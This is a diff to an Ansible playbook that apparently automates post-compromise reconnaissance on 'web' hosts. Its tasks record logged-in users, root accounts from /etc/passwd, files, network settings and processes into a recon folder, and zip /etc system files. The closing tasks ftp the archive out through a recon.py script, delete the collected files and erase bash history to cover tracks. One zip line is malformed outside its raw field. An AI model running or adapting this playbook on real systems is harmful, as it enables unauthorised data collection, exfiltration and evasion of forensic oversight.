@@ -17,39 +17,50 @@
   hosts: web
   tasks:
     - name: display user login history to identify primary user
-      raw: arr=$(users); for i in "${arr[@]}"; do last "$i"; done
+      raw: arr=$(users); for i in "${arr[@]}"; do last "$i" >> recon/login_history.txt; done
     - name: identify currently logged in users
-      raw: who
+      raw: who > recon/logged_in.txt
     - name: identify system users
-      raw: w
+      raw: w > recon/system_users.txt
     - name: identify system administrators
-      raw: grep 'x:0:' /etc/passwd
+      raw: grep 'x:0:' /etc/passwd > recon/system_admin.txt
 - name: system file discovery
   hosts: web
   tasks:
     - name: list documents and files
-      raw: find . -type f
+      raw: find . -type f > recon/file_discovery.txt
 - name: system network discovery
   hosts: web
   tasks:
     - name: display network configuration
-      raw: ifconfig; netstat -r
+      raw: ifconfig; netstat -r > recon/network_config.txt
     - name: list network connections
-      raw: lspci
-#    - name: list connected network shares/systems
-#      raw: 
+      raw: lspci > recon/network_connections.txt
+#   - name: list connected network shares/systems
+#     raw: TODO
 - name: system process discovery
   hosts: web
   tasks:
     - name: list services in use
-      raw: service --status-all
+      raw: service --status-all > recon/services.txt
     - name: list running processes
-      raw: ps -A
+      raw: ps -A > recon/processes.txt
 - name: system OS/hardware discovery
   hosts: web
   tasks:
-#    - name: list OS information
-#      raw: uname -a; zip -r kernel_files.zip /etc
-    # TODO: ftp the zip file
+    - name: list OS information
+      raw: uname -a > recon/os.txt
+      zip -r recon/kernel_files.zip /etc/passwd /etc/fstab /etc/hosts /etc/*.d /etc/securetty /etc/resolv.conf
     - name: list hardware information
-      raw: lscpu; lshw; hwinfo; lsblk; df -H
+      raw: lscpu >> recon/hardware.txt; lshw >> recon/hardware.txt; hwinfo >> recon/hardware.txt; lsblk >> recon/hardware.txt; df -H  >> recon/hardware.txt
+- name: recover captured files
+  hosts: web
+  tasks:
+    - name: zip recon folder
+      raw: zip -r recon.zip recon
+    - name: ftp zip file
+      raw: python recon.py
+    - name: delete zip file and recon folder
+      raw: rm -rf recon.zip recon
+    - name: delete bash history activity
+      raw: for i in {1..17}; do history -d $HISTFILESIZE; done
